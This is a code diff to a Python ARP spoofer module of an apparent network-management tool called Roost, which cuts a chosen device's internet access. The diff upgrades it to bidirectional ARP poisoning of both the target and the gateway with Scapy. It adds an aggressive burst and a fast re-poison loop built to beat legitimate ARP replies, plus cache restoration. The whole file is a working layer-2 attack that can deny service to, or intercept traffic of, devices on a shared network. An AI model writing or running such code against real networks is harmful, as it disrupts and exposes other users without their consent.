@@ -1,7 +1,22 @@
 """
-ARP Spoofer — cuts internet access for a device using ARP poisoning.
-Runs ARP spoof in a background thread per target device.
-CRITICAL: stop_spoof() must be called on shutdown to restore ARP caches.
+ARP Spoofer — cuts internet access for a device using classic bidirectional
+ARP poisoning.
+
+How the cut works (NetCut-style full block):
+  - We poison the TARGET: an ARP reply telling it that gateway_ip lives at
+    OUR mac (own_mac). The target now sends all internet-bound traffic to us.
+  - We poison the GATEWAY: an ARP reply telling it that target_ip lives at
+    OUR mac. The gateway now sends all return traffic for the target to us.
+  - Host IP forwarding stays OFF (we never re-forward). Both directions of the
+    target's traffic therefore terminate at our NIC and are dropped =
+    a complete internet cut for that one device only.
+
+We re-poison aggressively (initial burst + tight ~1s loop) so we keep winning
+the race against the real gateway's legitimate (solicited) ARP replies, which
+would otherwise let the target's cache self-heal.
+
+CRITICAL: stop_spoof()/stop_all_spoofs() must be called on shutdown to restore
+BOTH ARP caches, otherwise the target and the gateway stay poisoned.
 """
 import threading
 import time
@@ -15,43 +30,97 @@ logger = logging.getLogger("roost.arp_spoofer")
 _active: Dict[str, tuple] = {}
 _lock = threading.Lock()
 
+# A "null"/invalid MAC we must never use as an Ether source.
+_INVALID_MACS = {"", "00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"}
+
+# Re-poison cadence (seconds) and initial burst size.
+_REPOISON_INTERVAL = 1.0
+_INITIAL_BURST = 10
+_RESTORE_BURSTS = 6
+_RESTORE_SPACING = 0.2
+
+
+def _is_valid_mac(mac: str) -> bool:
+    """True if mac is a usable unicast MAC (12 hex digits, not null/broadcast)."""
+    norm = normalize_mac(mac or "")
+    if norm in _INVALID_MACS:
+        return False
+    # normalize_mac returns AA:BB:... only when it parsed 12 hex digits.
+    parts = norm.split(":")
+    return len(parts) == 6 and all(len(p) == 2 for p in parts)
+
+
+def _scapy_mac(mac: str) -> str:
+    """Return a lower-case colon-separated MAC for Scapy Ether/ARP fields."""
+    return normalize_mac(mac).lower()
+
 
 def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str,
                 gateway_mac: str, own_mac: str, iface,
                 stop_event: threading.Event):
-    """Thread: sends ARP poison packets every 1.5s until stop_event is set."""
+    """
+    Thread: bidirectionally poisons target<->gateway until stop_event is set,
+    then restores both ARP caches.
+    """
     try:
         from scapy.layers.l2 import Ether, ARP
         from scapy.sendrecv import sendp
 
-        src = own_mac.upper().replace("-", ":").replace(".", ":")
+        src = _scapy_mac(own_mac)            # our real NIC MAC (Ether src + hwsrc)
+        tgt = _scapy_mac(target_mac)
+        gw = _scapy_mac(gateway_mac)
 
-        # Best-practice block (NetCut-style):
-        # Tell the TARGET that the gateway's MAC is a non-existent "blackhole"
-        # address. The target then sends all outbound traffic to a MAC that
-        # belongs to no device — traffic is silently dropped by the switch.
-        #
-        # We do NOT touch the gateway's ARP table at all, so:
-        #   - Our laptop's internet is completely unaffected
-        #   - The router never sees a duplicate MAC for two IPs
-        #   - Only the target device loses internet access
-        BLACKHOLE = "de:ad:be:ef:de:ad"
-        pkt_to_target = (
-            Ether(src=src, dst=target_mac) /
-            ARP(op=2, hwsrc=BLACKHOLE, pdst=target_ip, psrc=gateway_ip)
+        # Poison the TARGET: "gateway_ip is at OUR mac".
+        poison_target = (
+            Ether(src=src, dst=tgt) /
+            ARP(op=2, psrc=gateway_ip, hwsrc=src, pdst=target_ip, hwdst=tgt)
+        )
+        # Poison the GATEWAY: "target_ip is at OUR mac".
+        poison_gateway = (
+            Ether(src=src, dst=gw) /
+            ARP(op=2, psrc=target_ip, hwsrc=src, pdst=gateway_ip, hwdst=gw)
         )
 
+        send_kwargs: dict = dict(verbose=False)
+        if iface:
+            send_kwargs["iface"] = iface
+
+        # Aggressive initial burst to corrupt both caches immediately and beat
+        # any in-flight legitimate replies.
+        logger.info(
+            f"ARP poison burst x{_INITIAL_BURST}: target {target_ip}/{tgt} and "
+            f"gateway {gateway_ip}/{gw} both -> our mac {src}"
+        )
+        burst_fail = 0
+        for _ in range(_INITIAL_BURST):
+            try:
+                sendp([poison_target, poison_gateway], **send_kwargs)
+            except Exception as e:
+                burst_fail += 1
+                logger.warning(f"ARP poison burst send error: {e}")
+        if burst_fail >= _INITIAL_BURST:
+            logger.error(
+                f"All {burst_fail} initial poison sends failed for {target_ip} "
+                "— interface/Npcap likely misconfigured; cut will not work"
+            )
+
+        # Steady-state tight re-poison loop.
+        consecutive_fail = 0
         while not stop_event.is_set():
             try:
-                kwargs: dict = dict(verbose=False)
-                if iface:
-                    kwargs["iface"] = iface
-                sendp(pkt_to_target, **kwargs)
+                sendp([poison_target, poison_gateway], **send_kwargs)
+                consecutive_fail = 0
             except Exception as e:
-                logger.debug(f"ARP send error (non-fatal): {e}")
-            time.sleep(1.5)
+                consecutive_fail += 1
+                # Surface persistent send failure rather than swallowing it.
+                if consecutive_fail in (1, 5, 25):
+                    logger.warning(
+                        f"ARP poison send failing for {target_ip} "
+                        f"(consecutive={consecutive_fail}): {e}"
+                    )
+            stop_event.wait(_REPOISON_INTERVAL)
 
-        # Restore: send correct ARP to undo poisoning
+        # Restore BOTH caches once we are told to stop.
         _restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, own_mac, iface)
 
     except Exception as e:
@@ -60,34 +129,51 @@ def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str,
 
 def _restore_arp(target_ip: str, target_mac: str, gateway_ip: str,
                  gateway_mac: str, own_mac: str, iface):
-    """Send gratuitous ARP to restore correct MAC mappings."""
+    """
+    Repair both ARP caches with the REAL macs via gratuitous ARP replies.
+    Frames are sourced from OUR NIC MAC (Ether src) to avoid switch MAC-flap /
+    port-security drops, while the ARP payload advertises the correct hwsrc.
+    """
     try:
         from scapy.layers.l2 import Ether, ARP
         from scapy.sendrecv import sendp
 
-        # Restore target's ARP cache: tell it the real gateway MAC
-        restore_target = (
-            Ether(src=gateway_mac, dst=target_mac) /
-            ARP(op=2, hwsrc=gateway_mac, hwdst=target_mac,
-                psrc=gateway_ip, pdst=target_ip)
+        src = _scapy_mac(own_mac)
+        tgt = _scapy_mac(target_mac)
+        gw = _scapy_mac(gateway_mac)
+
+        # Tell the target the REAL gateway MAC.
+        fix_target = (
+            Ether(src=src, dst=tgt) /
+            ARP(op=2, psrc=gateway_ip, hwsrc=gw, pdst=target_ip, hwdst=tgt)
+        )
+        # Tell the gateway the REAL target MAC.
+        fix_gateway = (
+            Ether(src=src, dst=gw) /
+            ARP(op=2, psrc=target_ip, hwsrc=tgt, pdst=gateway_ip, hwdst=gw)
         )
 
-        kwargs: dict = dict(count=3, verbose=False)
+        kwargs: dict = dict(verbose=False)
         if iface:
             kwargs["iface"] = iface
-        # Send several spaced bursts so at least one wins the race against the
-        # poison packets still in flight and reliably repairs the target's cache.
-        for _ in range(4):
-            sendp(restore_target, **kwargs)
-            time.sleep(0.25)
-        logger.info(f"ARP restored for {target_ip}")
+
+        for _ in range(_RESTORE_BURSTS):
+            try:
+                sendp([fix_target, fix_gateway], **kwargs)
+            except Exception as e:
+                logger.warning(f"ARP restore send error for {target_ip}: {e}")
+            time.sleep(_RESTORE_SPACING)
+        logger.info(
+            f"ARP restored for {target_ip} (target<->gateway caches repaired)"
+        )
     except Exception as e:
         logger.warning(f"ARP restore failed for {target_ip}: {e}")
 
 
 def start_spoof(target_ip: str, target_mac: str) -> bool:
     """
-    Start ARP spoofing for a target device. Returns True if started.
+    Start bidirectional ARP spoofing for a target device. Returns True if
+    started, False (with a logged reason) otherwise.
     NOTE: call this from a thread (e.g. run_in_executor) — _get_mac does
     blocking Scapy I/O which must not run on the async event loop.
     """
@@ -102,22 +188,52 @@ def start_spoof(target_ip: str, target_mac: str) -> bool:
             from backend.services.arp_scanner import _resolve_scapy_iface
             net = get_network_info()
 
-            # Safety: never spoof the gateway or our own device
+            # Safety: never spoof the gateway or our own device.
             if target_ip == net.gateway_ip or target_ip == net.own_ip:
                 logger.warning(f"Refusing to spoof gateway/own IP: {target_ip}")
                 return False
 
-            # Resolve the correct Scapy interface object (same logic as scanner)
-            resolved_iface = _resolve_scapy_iface(net.interface, net.own_ip)
-
-            # Get gateway MAC via ARP (uses explicit src MAC to avoid loopback bug)
-            gateway_mac = _get_mac(net.gateway_ip, resolved_iface, own_mac=net.own_mac)
-            if not gateway_mac:
+            # Our own MAC must be a real, valid MAC or every Ether src is junk.
+            if not _is_valid_mac(net.own_mac):
                 logger.error(
-                    f"Cannot get gateway MAC for {net.gateway_ip} — "
-                    "ensure Npcap is installed and running as Administrator"
+                    f"Cannot start spoof for {target_ip}: own MAC is invalid "
+                    f"({net.own_mac!r}) — interface detection failed"
                 )
                 return False
+
+            # Target MAC must be valid too (it is our L2 destination).
+            if not _is_valid_mac(mac):
+                logger.error(
+                    f"Cannot start spoof: target MAC is invalid ({target_mac!r})"
+                )
+                return False
+
+            # Resolve the correct Scapy interface object (same logic as scanner).
+            resolved_iface = _resolve_scapy_iface(net.interface, net.own_ip)
+            if resolved_iface is None:
+                logger.error(
+                    f"Cannot start spoof for {target_ip}: no usable network "
+                    f"interface resolved for {net.interface}/{net.own_ip}"
+                )
+                return False
+
+            # Resolve and VERIFY the gateway MAC before starting.
+            gateway_mac = _get_mac(net.gateway_ip, resolved_iface,
+                                   own_mac=net.own_mac)
+            if not _is_valid_mac(gateway_mac):
+                logger.error(
+                    f"Cannot get gateway MAC for {net.gateway_ip} "
+                    f"(got {gateway_mac!r}) — ensure Npcap is installed, the "
+                    "correct interface is selected, and Roost runs as "
+                    "Administrator. Aborting block."
+                )
+                return False
+
+            logger.info(
+                f"Starting bidirectional ARP spoof for {target_ip}/{mac}: "
+                f"gateway {net.gateway_ip}/{gateway_mac}, our mac {net.own_mac}, "
+                f"iface {resolved_iface}"
+            )
 
             stop_event = threading.Event()
             thread = threading.Thread(
@@ -137,7 +253,7 @@ def start_spoof(target_ip: str, target_mac: str) -> bool:
 
 
 def stop_spoof(target_mac: str) -> bool:
-    """Stop ARP spoofing for a device and restore its ARP cache."""
+    """Stop ARP spoofing for a device and restore both ARP caches."""
     mac = normalize_mac(target_mac)
     with _lock:
         if mac not in _active:
@@ -171,7 +287,7 @@ def _get_mac(ip: str, iface, own_mac: str = "") -> str:
         from scapy.layers.l2 import Ether, ARP
         from scapy.sendrecv import srp
 
-        src = own_mac.upper().replace("-", ":").replace(".", ":") if own_mac else None
+        src = _scapy_mac(own_mac) if _is_valid_mac(own_mac) else None
         if src:
             pkt = Ether(src=src, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=src, pdst=ip)
         else:
